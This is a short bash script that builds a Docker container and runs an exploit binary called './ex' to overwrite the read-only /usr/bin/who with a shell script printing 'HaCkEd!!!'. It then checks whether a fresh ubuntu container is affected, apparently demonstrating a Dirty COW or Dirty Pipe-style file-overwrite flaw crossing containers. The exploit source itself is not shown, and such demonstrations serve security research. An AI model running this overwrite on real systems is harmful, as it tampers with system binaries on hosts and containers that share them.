#!/bin/bash

set -x

docker rm -f dirty
docker rmi -f dirty ubuntu

docker build -t dirty . > /dev/null


docker run --rm -it --name dirty dirty bash -c 'set -x; who; timeout 10 ./ex /usr/bin/who "$(printf "#!/bin/sh\necho HaCkEd!!!;exit 0;\n")";who'

read -p "Press enter to continue"

docker run --rm -it ubuntu who

#docker rmi -f dirty ubuntu > /dev/null